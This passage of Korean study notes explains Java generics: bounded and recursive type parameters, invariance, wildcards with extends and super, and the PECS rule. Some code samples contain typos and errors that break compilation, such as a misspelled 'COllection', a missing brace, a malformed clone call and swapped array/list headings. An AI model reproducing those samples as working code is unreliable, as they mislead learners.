단, 자바에서는 다중 상속을 지원하지 않기 때문에 클래스로는 다중 extends는 불가능하고 오로지 인터페이스로만이 가능하다.

interface Readable {}
interface Closeable {}

class BoxType implements Readable, Closeable {}

class Box<T extends Readable & Closeable> {
	List<T> list = new ArrayList<>();

	public void add(T item) {
		list.add(item);
	}
}
public static void main(String[] args) {
	//Readable와 Closeable를 동시에 구현한 클래스만이 타입할당이 가능하다.
	Box<BoxType> box = new Box<>();

	//심지어 최상위 Object 클래스여도 할당이 불가능하다.
	Box<Object> box2 = new Box<>(); //Error
} 
```
```
제네릭이 여러개인 다중 타입 파라미터를 사용할 경우에도 각각 다중제한을 거는 것도 가능하다.
단, 가독성이 별로다

interface Readable {}
interface Closeable {}
interface Appendable {}
interface Flushable {}

class School<T extends Readable & Closeable, U extends Appendable & Closeable & Flushable> 
    void func(T reader, U writer){
    }
}
```
```
#)재귀적 타입 한정
자기자신이 들어간 표현식을 사용하여 타입 매개변수의 하용범위를 한정 시키는 것
실무에선 주로 Comparable 인터페이스와 함께 쓰인다.

예를들어 다음과 같이 <E extends Comparable<E>> 제네릭 E의 타입 범위를 Comparable<E> 로
한정한다는 E를 중첩시킨 표현식을 사용할수 있는데, 
이 말은 '타입 E는 자기 자신을 서브 타입으로 구현한 Comparable 구현체로 한정' 한다는 뜻이다.


Tip) Comparable는 객체끼리 비교를 해야 할때 compareTo() 메서드를 오버라이딩할때 
구현하는 인터페이스이다.
자바에서 Integer, Double, String 등이 값 비교가 되는 이유가 
기본적으로 Comparable를 구현하고 있기 때문이다. 

즉, Integer 객체를 제네릭 타입 E에 할당하게 된다면, 
Comparable을 구현한 객체면서 오로지 같은 E인 Integer 타입만 받는다는 의미가 된다. 
(자기 자신만 받는 다는 표현을 어렵게 빙돌려 표현한 것이다)

다음은 컬렉션을 인자로 받아 컬렉션의 요소들을 최대값(max)를 구해 반환하는 메서드 예제이다. 
제네릭 메서드 타입으로 재귀적 타입 한정이 사용되었다.

class Compare {
	//외부로 들어온 타입E는 Comparable<E>를 구현한 E 객체이어야 한다.
	//max가 함수이름이고 인자가 Collection<E> collection이다.
	public static <E extends Comparable<E>> E max(Collection<E> collection) {
		if(collection.isEmpty()) throw new IllegalArgumentException("컬렉션이 비어있습니다.");

		E result = null;
		for(E e: collection) {
			if(result == null) {
				result = e;
				continue;
			}
			if(e.compareTo(result) > 0) {
				result = e;
			}
		}
		return result;
	}
}
public static void main(String[] args) {
	COllection<Integer> list = Arrays.asList(56,34,12,31,65,77,91,88);
	System.out.println(Compare.max(list)); //91

	Collection<Number> list2 = Arrays.asList(56,34,12,31,65,77,91,88);
	//Number추상메서드는 Comparable를 구현하지 않았기때문에 불가능
	System.out.println(Compare.max(list2));
}

```
```
#)제네릭 형변환
- 제네릭 캐스팅 문제
배열과 같은 일반적인 변수 타입과 달리 지네릭 서브 타입간에는 형변환이 불가능하다. 
심지어 대입된 타입이 Object일지라도 말이다. 
자연스럽게 다형성이 적용될 것이라 생각하였지만, 
실상 제네릭은 전달받은 딱 그 타입으로만 서로 캐스팅이 가능한 것이다.

처음에 소개한 타입 파라미터의 다형성은 포함 원소로서 가능하다는거지, 
형변환은 객체 대 객체를 말하는 거니 다른 개념이다.

//배열은 가능
Object[] arr = new Integer[1];

//제네릭은 Error
List<Object> list = new ArrayList<Integer>();

------
List<Object> listObj = null;
List<String> listStr = null;

//에러 List<String> -> List<Object>
listObj = (List<String>) listStr;

//에러 List<Object> -> List<String>
listStr = (List<Object>) listObj;


이러한 특징의 문제가 제네릭 객체에 요소를 넣거나 가져올 때,
캐스팅문제로 인해 애로사항이 발생하기 떄문이다.

예를들어 배열 같은경우 반복문의 변수로 Object타입으로 받아 사용해도 문제가 없다.

public static void main(String[] args) {
	Apple[] integers = new Apple[] {
		new Apple(),
		new Apple(),
		new Apple(),
	};
	print(integers); //아래로 던짐
}
public static void print(Fruit[] arr) {
	for(Object e : arr) { //일반 배열은 Object로 받아도 괜찮음
		System.out.println(e);
	}
}
```
```
하지만 위의 코드에서 배열을 리스트의 제네릭으로 바꾸면 컴파일 에러가 발생한다.
public static void main(String[] args) {
	List<Integer> lists = new ArrayList<>(Arrays.asList(1,2,3));
	print(lists); //컴파일에러발생
}
public static void print(List<Object> list) { //Object로 받으면 에러 발생
	for(Object e : list) {
		System.out.println(e);
	}
}

배열 같은 경우 print 메서드의 매개변수로 아규먼트가 넘어갈때 
Integer[] 배열 타입이 Object[] 배열 타입으로 
업캐스팅Visit Website이 적용되어 문제가 없지만, 
제네릭 같은 경우 타입 파라미터가 오로지 똑같은 타입만 받기 때문에 
다형성을 이용할수 없어서 그런 것이다.
```
```
#)제네릭 와일드 카드
따라서 제네릭 간의 형변환을 성립되게 하기 위해서는 제네릭에서 제공하는
와일드카드 '?' 문법을 이용하여야 한다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/60.PNG" width="650" height="300" /><br><br>
```
public static void main(String[] args) {
	List<Integer> lists = new ArrayList<>(Arrays.asList(1,2,3));
	print(lists); //잘됨
}
//Number와 그 하위타입(Integer, Double등)만을 받는다.
public static void print(List<? extends Number> list) {
	for(Object e : list) {
		System.out.println(e);
	}
}
```
```
#)제네릭타입소거
제네릭은 타입 안정성을 위해 JDK 1.5부터 도입된 문법으로 
이전 자바에서는 제네릭 타입 파라미터 없이 자바 언어를 코딩해왔다. 

그래서 이전의 자바 버전의 코드와 호환성을 위해 
제네릭 코드는 컴파일되면 제네릭 타입은 사라지게 된다. 
즉, 클래스 파일(.class)에는 제네릭 타입에 대한 정보는 존재하지 않는 것이다.
어찌보면 제네릭은 실제 바이트 코드에는 없는 반쪽짜리 언어 문법이라고 할수 있다. 
그래서 제네릭을 개발자가 잘못된 방향으로 설계를 하면 
잠재적인 힙 오염(heap pollution) 문제에 빠지게 될 수 있다. 

따라서 우리가 바이트 코드를 보고 코딩할 것은 아니지만, 
올바르게 제네릭을 설계하기 위해선 제네릭의 컴파일 과정을 한번 쯤 알아둘 필요성이 있다.

```

```
#)자바의 공변성/반공변성
공변성/반공변성 합쳐서 변성이라 하는데
변성은 타입의 상속계층관계에서 서로 다른 타입간에 어떤 관계가 있는지를 나타내는 지표이다.

예를들어 배열과 리스트가 있다고하자.
공변: S가 T의 하위타입이면
S[]는 T[]의 하위타입이다.
List<S>는 List<T>의 하위타입이다.

반공변: S가 T의 하위타입이면,
T[]는 S[]의 하위타입이다.(공변의 반대)
List<T>는 List<S>의 하위타입이다.(공변의 반대)

무공변/불공변 : S와 T는 서로 관계가 없다.
List<T>와 List<S>는 서로 다른 타입이다.
```

```
이를 자바 코드로 나타내면 아래와 같다.
#) 리스트
//공변성
Object[] Covariance = new Integer[10];

//반공변성
Integer[] Contravariance = (Integer[]) Convariance

#)배열
//공변성
ArrayList<Object> Covariance = new ArrayList<Integer>();

//반공변성
ArrayList<Integer> Contravariance = new ArrayList<Object>();

위의 차이점은 배열과 달리 제네릭에서는 돌아가지않는다.
왜냐하면 자바는 일반적으로 제네릭타입에 대해서 공변성/반공변성을 지원하지 않기 때문이다.

즉, 자바의 제네릭은 무공변의 성질을 지닌다.
```
```
#)객체 타입은 상하관계가 있다.
이부분은 잘 알고 있는 다형성의 성질의 예이다.

parent와 child는 서로간에 캐스팅이 가능하다.

object
   |
Number
   |
Integer

Object parent = new Object();
Integer child = new Integer(1);

parent = child; //다형성(업캐스팅)

-------------
Object parent = new Integer(1);
Integer child;

child = (Integer) parent; //다형성 (다운캐스트)
```

```
일반클래스가 아닌 제네릭 클래스여도 똑같이 다형성이 적용되는건 마찬가지이다.

제네릭 클래스에도 아래처럼 상속관계가 있다.(제네릭타입이 불가능한것이지 클래스는 가능하다.)
Collection<Integer>
     |
List<Integer>
     |
ArrayList<Integer>


Collection<Integer> parent = new ArrayList<>();
ArrayList<Integer> child = new ArrayList<>();

parent = child; //다형성(업캐스팅)
```

```
단, 제네릭 타입은 상하관계가 없다.

즉, 제네릭의 타입 파라미터(꺾쇠 괄호) 끼리는 타입이 아무리 상속 관계에 놓인다 한들 캐스팅이
불가능하다. 왜냐하면 제네릭은 무공변 이기 때문이다. 
제네릭은 전달받은 딱 그 타입으로만 서로 캐스팅이 가능하다.

ArrayList<Object>
	  |
ArrayList<Number>
      |
ArrayList<Integer>

ArrayList<Object> parent = new ArrayList<>();
ArrayList<Integer> child = new ArrayList<>();

perent = child; //업캐스팅 불가능
child = parent; //다운캐스팅 불가능
```
```
#)공변성이 없으면 나타나는 문제점
이 특징이 왜 문제가 되냐면 매개변수로 제네릭을 사용할 때, 외부에서 대입되는 인자의
캐스팅 문제로 인해 애로사항이 발생하기 때문이다.

//아래 배열을 이용한 코드는 문제가 없다.
public static void print(Object[] arr) {
	for(Object e : arr) {
		System.out.println(e)
	}
}

public static void main(String[] args) {
	Integer[] integers = {1,2,3};
	print(integers); //[1,2,3]
}

---------------------
//이번엔 배열이 아닌 제네릭 객체로 넘겨보자
그러면 메서드 호출 부분에서 컴파일 에러가 발생한다.

public static void print(List<Object> arr) { //Object로 받아보자
	for(Object e : arr) {
		System.out.println(e)
	}
}
public static void main(String[] args) {
	List<Integer> integers = Arrays.asList(1,2,3);
	print(integers) //에러가 난다
}
```

```
배열 같은 경우 print 메서드의 매개변수로 아규먼트가 넘어갈 때
Integer[] 배열타입이 Object[] 배열 타입으로 자연스럽게 업캐스팅이 적용되어 문제가 없지만,

리스트 제네릭같은경우 타입파라미터가 오로지 똑같은 타입만 받기때문에 캐스팅이 되지 않는다.

그렇다면 외부로부터 값을 받는 매개변수의 제네릭타입 파라미터를 Integer로 고정된 타입으로
작성해주어야 하는데, 프로그램의 실행부에서 반드시 Integer 타입만 들어온다는 보장도 없으며,

만인, Double 형이나 아니면 상위타입인 Number형과 같은 다른 타입의 값도 받고 싶은 경우,
메서드를 오버로딩하여 즐비하게 코딩해야한다.

public static void print(List<Integer> arr) {}
public static void print(List<Double> arr) {}
public static void print(List<Num> arr) {}

그럼 제네릭은 자바의 특징이라고 하는 객체지향을 전혀 이용하지 못하는 것인가
-> 이를 해결하기 위해 제네릭 와일드 카드가 나온것이다.
```
```
#)제네릭 와일드카드
자바 제네릭을 이용해 프로그래밍할 때 간혹 클래스 정의문을 보다보면 꺽쇠 괄호 ? 물음표 기호가
있는것을 한번쯤 본적이 있을 것이다. 이 물음표가 와일드 카드이며, 물음표의 의미답게 어떤 타입이든
될수 있다는 뜻이다.

하지만 단순히 <?>로 사용하면 Object 타입과 다름이 없어지므로 보통 제네릭 한정 연산자와 함께쓰인다.

와일드카드의 타입 범위를 제한하는 키워드는 extends와 더불어 super가 있다.
extends와 super 키워드는 클래스 상속관계에서의 타입을 하위타입으로만 제한할지,
상위타입으로만 제한할지에 따라 쓰임새가 다르게 된다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/61.PNG" width="650" height="300" /><br><br>

```
#)와일드카드의 공변성/반공변성

실제 ArrayList의 기능 중 일부 메서드만 추려서 별도로 재구성한 MyArrayList제네릭 클래스 예제이다.

MyArrayList생성자(Constructor)를 보면, 컬렉션(Collection)을 받아 컬렉션을 순회하여
컬렉션 내에 들어있는 모든 요소를 내부 배열(Object)에 넣어 제네릭 객체를 생산하는 역할을 한다.

MyArrayList의 clone 메서드를 보면, 빈 컬렉션을 받아 내부 배열을 순회하여
배열내에 들어있는 모든 요소를 컬렉션에 넣어주는, 매개변수로 받은 제네릭 객체를 소비하는 역할,

class MyArrayList<T> {
	Object[] element = new Object[5];
	int index = 0;

	//외부로부터 리스트를 받아와 매개변수의 모든 요소를 내부 배열에 추가하여 인스턴스화 하는
	생성자이다.
	public MyArrayList(Collection<T> in) {
		for(T elem : in) { 
			element[index++] = elem;
		}
	}

	//외부로부터 리스트를 받아와 내부 배열의 요소를 모두 매개변수(파라미터)에 추가해주는 메서드
	public void clone(Collection<T> out) {
		for(Object elem : element) {
			out.add((T) elem);
		}
	}

	@Override
	public String toString() {
		return Arrays.toString(element); //배열요소들 출력
	}
}

public static void main(String[] args) {
	//MyArrayList의 제네릭 T 타입은 Number
	MyArrayList<Number> list;

	//MyArrayList 생성하기
	Collection<Integer> col = Arrays.asList(1,2,3,4,5);
	list = new MyArrayList<>(col); //에러가난다. -> class MyArrayList<T>에서 T는 여기서 Number가 된다.

	//MyArrayList 출력
	System.out.println(list);
}

결과는 컴파일 에러이다.

왜냐하면 매개변수는 Collection<Number> 타입으로 받는데 Collection<Integer> 객체를
전달해주었기 때문이었다. Integer는 Number를 상속하여 둘은 부모-상속관계이지만
제네릭의 타입 파라미터는 기본적으로 공변성이 없이 성립되지 않게 되는 것이다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/62.PNG" width="650" height="300" /><br><br>

```
그래서 하는 수 없이 col 객체의 제네릭 타입을 똑같이 Collection<Number>로 맞춰주고
나서야 MyArrayList 인스턴스를 생산할 수 있게 되었다.
```
```
자, 이번에는 clone메서드를 보자

MyArrayList의 clone 메서드에 빈 LinkedList를 인자로 줘서 
MyArrayList에 들어있는 원소들을 복사하여 넣기위해 메서드를 호출하였다. 
이때 String 타입이든 Number 타입이든 모든 타입의 데이터를 받을 수 있게 하기 위해 
Object 타입 파라미터로 설정하였다.

public static void main(String[] args) {
	//MyArrayList의 제네릭 T 타입은 Number
	MyArrayList<Number> list;

	//MyArrayList 생성하기
	Collection<Number> col = Arrays.asList(1,2,3,4,5);
	list = new MyArrayList<>(col);

	//LinkedList에 MyArrayList 요소들 복사하기
	List<Object> temp = new LinkedList<>();
	temp.list.clone(temp); // 에러발생

	//LinkedList 출력
	System.out.println(temp);
} 
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/63.PNG" width="650" height="300" /><br><br>

```
역시나 결과는 꽝이다.

제네릭은 반공변 역시 성립되지 않기 때문에 Collection<Number>에 Collection<Object>가 들어가는 행위는
성립되지 않는다.

이처럼 자바의 제네릭은 기본적으로 공변,반공변을 지원하지 않지만,
<? extends T>, <? super T> 와일드카드를 이용하면 컴파일러 트릭을 통해 공변, 반공변이 적용되도록
설정할 수 있다.

- 상한 경계와일드카드 : <? extends T>  -> 공변성 적용
- 하한 경계와일드카드 : <? super T> -> 반공변성 적용
```

```
#)상한 경계와일드카드(공변)
MyArrayList를 설계한 개발자의 의도는 Collection<Integer>와 Collection<Double> 객체를 생성자의
인수로 모두 받아 배열에 넣고 싶은 것이다. 
이를 위해 제네릭에 상한경계와일드카드를 적용시킨다.

class MyArrayList<T> {
	Object[] element = new Object[5];
	int index = 0;

	//외부로부터 리스트를 받아와 매개변수의 모든 요소를 내부 배열에 추가하여 인스턴스화하는 생성자
	//여기서 T는 Number, 아래 메인 메소드 보면 MyArrayList<Number> list로 선언을 했음.
	//? 는 Number 와 Number를 상속받는 애들이 올 수 있다.
	public MyArrayList(Collection<? extends T> in) {
		for(T elem : in) {
			element[index++] = elem;
		}
	}
}
public static void main(String[] args) {
	//MyArrayList의 제네릭 T타입은 Number
	MyArrayList<Number> list;

	//MyArrayList 생성하기
	Collection<Integer> col = Arrays.asList(1,2,3,4,5);
	list = new MyArrayList<>(col);

	//MyArrayList 출력
	System.out.println(list); //[1,2,3,4,5]
}

그러면 공변성질이 적용되어 컴파일 에러 없이 정상적으로 MyArrayList에 요소가 들어가 생산되었음을
확인 할 수 있다.

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/64.PNG" width="650" height="300" /><br><br>

```
즉, Integer가 Object의 하위타입일 경우,
C<Integer>는 C<? extends Object>의 하위타입이 되는 것이다.

ArrayList<? extends Object> parent = new ArrayList<>();
ArrayList<? extends Integer> child = new ArrayList<>();

parent = child // 공변성(제네릭 타입 업캐스팅)

```

```
#)하한 경계와일드카드 (반공변)
MyArrayList의 clone메서드를 설계한 개발자의 의도는 MyArrayList의 제네릭 타입 파라미터가 무엇이든
인자로 받은 컬렉션 매개변수에 요소들을 모두 집어넣고 싶은 것이다.
이를 위해 제네릭에 하한경계와일드카드를 적용시킨다.

class MyArrayList<T> {
	Object[] element = new Object[5];
	int index = 0;

	public MyArrayList(Collection<? extends T> in) {
		for(T elem : in) {
			element[index++] = elem;
		}
	}

	public void clone(Collection<? super T> out) { //T는 Number
		for(Object elem : element) {
			out.add((T)elem);
		}
	}
	@Override
	public String toString() {
		return Arrays.toString(element); 
	}
}
public static void main(String[] args) {
	//MyArrayList의 제네릭 T 타입은 Number
	MyArrayList<Number> list = new MyArrayList<>(Arrays.asList(1,2,3,4,5));

	//LinkedList에 MyArrayList 요소들 복사하기
	List<Object> temp = new LinkedList<>();
	temp = list.clone(temp);

	//LinkedList 출력
	System.out.println(temp); // [1,2,3,4,5]
}

반공변 성질이 적용되어 컴파일 에러없이 정상적으로 MyArrayList에 요소가
들어가있음을 확인 할 수 있다.


```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/65.PNG" width="650" height="300" /><br><br>

```
즉, Object가 Integer의 상위타입일 경우, C<Object>는 C<? super Integer>의 하위타입이 되는 것이다.

ArrayList<? super Object> parent = new ArrayList<>();
ArrayList<? super Integer> child = new ArrayList<>();

child = parent; //반공변성(제네릭 다운캐스팅)
```
```
#)비한정적 와일드 카드
제네릭에 extends, super 범위 따지지 않고 심플하게 <?> 비한정적 와일드카드로만
구성해주면 어떻게 될까?

어떠한 타입도 올 수 있다는 점은 치트키이지만, 동시에 어떠한 타입도 올 수 있는
문제때문에 매개변수를 꺼내거나 저장하는 로직은 논리적 에러가 난다.



```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/66.PNG" width="650" height="300" /><br><br>

```
하지만 extends, super를 통해 와일드카드의 경계를 정해주면, 타입의 범위 내에서
추론을 하기 때문에 경고는 발생할지라도 오류는 나지않게 되는 것이다.

```
```
#)와일드카드 경계범위
다음과 같은 클래스 타입의 상속관계가 있다고 하자
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/67.PNG" width="650" height="300" /><br><br>

```
//제네릭 타입 클래스
class Box<T> {}
//타입계층관계
class Food {}
class Fruit extends Food {}
class Vegetable extends Food {}
class Apple extends Fruit {}
class Banana extends Fruit {}
class Carrot extends Vegetable {}
```

```
#)상한경계 <? extends U>
- 타입 매개변수의 범위는 U클래스이거나, U를 상속한 하위 클래스(U와 U의 자손타입만 가능)
- 상한의 뜻: 타입의 최고한도는 U라는 의미(최대 U이하)
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/68.PNG" width="650" height="300" /><br><br>

```
Box<? extends Fruit> box1 = new Box<Fruit>();
Box<? extends Fruit> box2 = new Box<Apple>();
Box<? extends Fruit> box3 = new Box<Banana>();
```

```
#)하한경계 <? super U>
- 타입 매개변수의 범위는 U클래스이거나, U가 상속한 상위클래스(U와 U의 조상타입만 가능)
- 하한의 뜻: 타입의 최저한도는 U라는 의미(최소 U이상)
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/69.PNG" width="650" height="300" /><br><br>

```
Box<? super Fruit> box1 = new Box<Fruit>();
Box<? super Fruit> box2 = new Box<Food>();
Box<? super Fruit> box3 = new Box<Object>();
```

```
#)비경계 <?>
- 타입 매개변수의 범위는 제한이 없다. (모두가능)
- <? extends Object> 의 줄임표현
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/70.PNG" width="650" height="300" /><br><br>

```
Box<?> box1 = new Box<Vegetable>();
Box<?> box2 = new Box<Fruit>();
Box<?> box3 = new Box<Food>();
Box<?> box3 = new Box<Carrot>();
```
```
#)와일드카드 경계 꺼내기/넣기 고찰
와일드카드를 하한경계로 지정했는가 하한경계로 지정했는가에 따라
제네릭타입 객체에 원소를 꺼내거나 집어넣기 행위에 대해 복잡한 제약이 걸리기 때문이다.

List<? extends U>
- GET : 안전하게 꺼내려면 U타입으로 받아야 한다.
- SET : 어떠한 타입의 자료도 넣을 수 없음(null만 삽입가능)
- 꺼낸타입은 U / 저장은 NO

메서드의 매개변수의 제네릭 타입이 <? extends Fruit> 라는 것은 Apple, Banana,Fruit 타입을 전달 받아
내부에서 다룰수 있다는 말이다.

class FruitBox {
	public static void method(List<? extends Fruit> item) {
		//안전하게 꺼내려면 Fruit타입으로만 받아야한다.
		Fruit f1 = item.get(0);

		Apple f2 = (Apple) item.get(0); //잠재적 에러(banana를 꺼낼수도있으니)
		Banana f3 = (Banana) item.get(0); //잠재적 에러
	}
}

public class Main {
	public static void main(String[] args) {
		List<Banana> bananas = new ArrayList<>(
			Arrays.asList(new Banana(), new Banana(), new Banana())
		);
		FruitBox.method(bananas);
	}
}

꺼내는것(GET)을 왜 Fruit타입으로 받아야되냐면
1. 만일 매개변수에 List<Banana>타입으로 들어올 경우 Apple f2 에 형제 캐스팅이 불가능하기 때문
2. 만일 매개변수에 List<Fruit>타입으로 들어올 경우 Apple f2 에 다운캐스팅이 불가능하기 때문
3. 이러한 논리오류로 와일드카드 최상위 범위인 Fruit타입으로만 안전하게 꺼낼 수 있다.
```

```
그리고 저장하는데(SET) 어떠한 타입도 불가능하냐면

class FruitBox {
	public static void method(List<? extends Fruit> item) {
		//저장은 NO
		item.add(new Fruit()); //!ERROR
		item.add(new Apple()); //!ERROR
		item.add(new Banana()); //!ERROR

		item.add(null); //null만 삽입가능
	}
}
1. 만일 매개변수에 List<Banana> 타입으로 들어올 경우 
형제 객체인 new Apple() 저장이 불가능하기 때문이다.
2. 만일 매개변수에 List<Fruit> 타입으로 들어올 경우는 
문제가 없겠지만 위의 논리 오류 때문에 그냥 컴파일 에러로 처리된다.
3. 따라서 만일 매개변수에 값을 넣고 싶다면 무조건 super 와일드카드를 사용하여야 한다.
```

```
#) List<? super U>
- GET : 안전하게 꺼내려면 Object 타입으로만 받아야한다.
- SET : U와 U의 자손타입만 넣을 수 있음(U의 상위타입 불가능)
- 꺼낸타입은 Object / 저장은 U와 그의 자손만

메서드의 매개변수의 제네릭 타입이 <? super Fruit> 라는 것은
Fruit, Food, Object 타입을 전달받아 내부에서 다룰 수 있다는 말이다.

class FruitBox {
	public static void methid(List<? super Fruit> item) { //리스트를 인자로 받는다.
		//안전하게 꺼내려면 Object 타입으로만 받아야한다
		Object f1 = item.get(0);

		Food f2 = (Food)item.get(0); //잠재적에러
		Fruit f3 = (Fruit)item.get(0); //잠재적에러
		Apple f4 = (Apple)item.get(0); //잠재적에러
		Banana f5 = (Banana)item.get(0); //잠재적에러
	}
}
public class Main {
	public static void main(String[] args) {
		List<Food> foods = new ArrayList<>(
			Arrays.asList(new Food(), new Food(), new Food())
		);
		FruitBox.method(foods);
	}
}

그런데 꺼내는 것이 왜 Object타입으로 받아야 되냐면,
1. 만일 매개변수(method함수)에 List<Food> 타입으로 들어올경우 Fruit f3에 
캐스팅이 불가능하기 때문이다.
2. 이러한 논리오류로 와일드카드 최상위범위인 Object 타입으로만 안전하게 꺼낼수 있는 것이다.

class FruitBox {
	static void method(List<? super Fruit> item) {
		//저장은 무조건 Fruit와 그의 자손 타입만 넣을 수 있다.
		item.add(new Fruit());
		item.add(new Apple());
		item.add(new Banana());

		item.add(new Object()); //에러
		item.add(new Food()); //에러
	}
}

그리고 저장하는데 거꾸로 Fruit과 그의 자손타입만 올 수 있냐면,
1. 만일 매개변수에 List<Fruit> 타입으로 들어올 경우 new Food()를 저장이 불가능하기 때문
2. 따라서 어떠한 타입이 와도 업캐스팅 가능 상한인 Fruit타입으로만 제한된다.

```

```
#) List<?>
- GET : 안전하게 꺼내려면 Object 타입으로만 받아야한다. (super의 특징)
- SET : 어떠한 타입의 자료도 넣을 수 없음(null만 삽입 가능) (extends의 특징)
- 꺼낸 타입은 Object / 저장은 No

메서드의 매개변수의 제네릭 타입이 <?> 라는 것은 모든 타입을 전달받아
내부에서 다룰 수 있다는 말이다.

class FruitBox {
	static void method(List<?> item) {
		//꺼내는건 Object 타입만 가능
		Object f1 = item.get(0);

		Food f2 = (Food)item.get(0); //잠재적에러
		Fruit f3 = (Fruit)item.get(0); //잠재적에러
		Apple f4 =(Apple)item.get(0); //잠재적에러
		Banana f5 = (Banana)item.get(0); //잠재적에러
	}
}

//저장
class FruitBox {
	static void method(List<?> item) {
		//저장은 NO(null만 지정)
		item.add(new Object()); // ! ERROR
        item.add(new Food()); // ! ERROR
        item.add(new Fruit()); // ! ERROR
        item.add(new Apple()); // ! ERROR
        item.add(new Banana()); // ! ERROR

        item.add(null);
	}
}

```

```
#)와일드카드 extends / super사용시기
언제 어디서 어느때에 와일드카드 <? extends T> 를 사용해야 할지, 
<? super T> 를 사용해야 할지 딱 머릿속에 잡히지 않는다. 

이는 현업에서도 자주 고민되는 사항이며, 
그래서 자바 개발자라면 한번 쯤 읽어봐야 하는 
조슈아 블로흐(Joshua J. Bloch)의 저서 Effective Java에서도 이에 대해서 PECS 라는 공식을 소개한다.

#)PECS 공식
Producer-Extends / Consumer-Super 라는 단어의 약자인데
- 외부에서 온 데이터를 생산(Producer)한다면 <? extends T>를 사용
- 외부에서 온 데이터를 소비(Consumer)한다면 <? super T>를 사용

예시로 보자
class MyArrayList<T> {
    Object[] element = new Object[5];
    int index = 0;

    // 외부로부터 리스트를 받아와 매개변수의 모든 요소를 내부 배열에 추가하여 인스턴스화 하는 생성자
    public MyArrayList(Collection<? extends T> in) {
        for (T elem : in) {
            element[index++] = elem;
        }
    }

    // 외부로부터 리스트를 받아와 내부 배열의 요소를 모두 매개변수에 추가해주는 메서드
    public void clone(Collection<? super T> out) {
        for (Object elem : element) {
            out.add((T) elem);
        }
    }
}
```
```
#)Producer Extend
위의 예제에서 extends 가 쓰이는 곳은 생성자 메서드의 매개변수 부분이다. 
즉, 외부에서 온 데이터를 매개변수에 담아 for문으로 순회하여 
MyArrayList를 인스턴스화(생성)하는 생산자(Producer) 역할을 하고 있다고 말할 수 있다.

class MyArrayList<T> {
    Object[] element = new Object[5];
    int index = 0;

    // 외부로부터 리스트를 받아와 매개변수의 모든 요소를 내부 배열에 추가하여 인스턴스화 하는 생성자
    public MyArrayList(Collection<? extends T> in) {
        for (T elem : in) { 
            element[index++] = elem;
        }
    }

    ...
}
```

```
#)Consumer Super
외부에서 리스트를 받아 요소를 복사하여 적재하는 clone 메서드의 매개변수에는 super 와일드카드 키워드가 쓰였다. 
즉, MyArrayList의 내부 배열을 소비하여 매개변수 리스트에 적재하는 행위를 하고 있다고 볼 수 있는 것이다.

class MyArrayList<T> {
    Object[] element = new Object[5];
    int index = 0;
    
    ...
    
    // 외부로부터 리스트를 받아와 내부 배열의 요소를 모두 매개변수에 추가해주는 메서드
    public void clone(Collection<? super T> out) {
        for (Object elem : element) {
            out.add((T) elem);
        }
    }
}
```

```
#) in / out 공식
오라클 공식 문서에서는 PECS 대신 in 과 out의 개념으로 와일드카드 사용처를 설명한다.

위의 예제에서도 in과 out 방법을 사용했는데, extends에선 매개변수명이 in이고,
super에선 매개변수명이 out인걸 확인 할 수 있다. 

즉,
in변수는 코드에 복사할 데이터를 제공이 목적 -> extends
out변수는 다른 곳에서 사용할 데이터를 보유 -> super

public static <E> void copyList(List<? extends E> in, List<? super E> out) {
	for(E elem : in) { //받은인자로 for문 돌리고
		out.add(elem); //또 다른 받은인자에다가 요소 추가
	}
}

위의 와일드카드의 제약 파트에서 배웠듯이, 
extends 는 애초에 원소 set은 못하고 오로지 get 만 가능하다. 

따라서 제네릭 타입 매개변수의 데이터를 가져오는 역할을 하면 상한 경계 와일드카드 를 사용한다고 보면 된다.
super은 애초에 원소 get은 Object로 가져오니 의미가 없다고 보면되고, 
그러면 오로지 set 만 가능하다. 
따라서 제네릭 타입 매개변수의 데이터에 적재하는 역할을 하면 하한 경계 와일드카드 를 사용한다고 보면 된다.

```

```
#)혼동주의
- 와일드카드는 설계가 아닌 사용을 위한 것

새내기 개발자분들이 가장 많이 착각하는 것이 와일드카드를 어디서나 사용할수 있다고 생각하는 것이다. 
하지만 와일드카드는 아래와 같이 클래스나 인터페이스 제네릭을 설계할때는 아예 사용할수가 없다.

//아래처럼 설계에 쓸 수 없다.
class Sample<? extends T> {} //에러발생

//와일드카드는 이미 만들어진 제네릭 클래스나 메서드를 사용할때 이용하는 것으로 보면 된다. 
예를들어 다음과 같이 변수나 매개변수에 어떠한 객체의 
타입 파라미터를 받을때 그에 대한 범위 한정을 정할때 사용된다고 보면 된다.

class Sample<T> {
	public static <E> void run(List<? super E> l) {}
}
pulic class Main {
	public static void main(String[] args) {
		//한개선언
		Sample<?> s2 = new Sample<String>();

		//두개선언
